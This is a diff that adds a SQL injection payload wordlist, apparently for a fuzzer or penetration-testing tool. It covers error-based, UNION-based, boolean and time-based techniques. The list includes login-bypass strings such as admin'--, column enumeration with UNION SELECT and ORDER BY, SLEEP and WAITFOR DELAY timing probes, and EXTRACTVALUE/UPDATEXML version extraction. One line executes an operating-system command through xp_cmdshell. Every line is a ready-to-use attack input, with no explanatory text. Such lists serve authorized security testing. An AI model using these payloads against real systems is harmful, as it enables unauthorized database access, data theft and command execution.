@@ -1,0 +1,83 @@
+# SQLi - Error / Union / Boolean / Time
+'
+"
+'
+"
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+" OR "1"="1
+" OR "1"="1"--
+' OR 1=1--
+' OR 1=1#
+" OR 1=1--
+' OR ''='
+" OR ""="
+1' OR '1'='1
+1' OR '1'='1'--
+1" OR "1"="1
+1' AND '1'='1
+' AND 1=1--
+' AND 1=1#
+" AND 1=1--
+' AND '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+" UNION SELECT NULL--
+1 UNION SELECT NULL--
+' UNION ALL SELECT NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 10--
+' ORDER BY 1--
+' ORDER BY 2--
+' GROUP BY 1--
+' GROUP BY 2--
+'; WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+' OR SLEEP(5)#
+1' AND SLEEP(5)--
+1" AND SLEEP(5)--
+1 AND SLEEP(5)--
+1'; WAITFOR DELAY '0:0:5'--
+1" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+(SELECT * FROM (SELECT(SLEEP(5)))a)
+'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+'
+"
+`
+\'
+\"
+'"
+''
+""
+'''' 
+"""" 
+'"
+"'
+' OR 1--
+" OR 1--
+' OR 1=1
+" OR 1=1
+admin'--
+admin'#
+' or 1=1 or ''='
+' or 1=1 or ""="
+-1' OR 3*2*1=6 AND '1'='1
+-1" OR 3*2*1=6 AND "1"="1
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
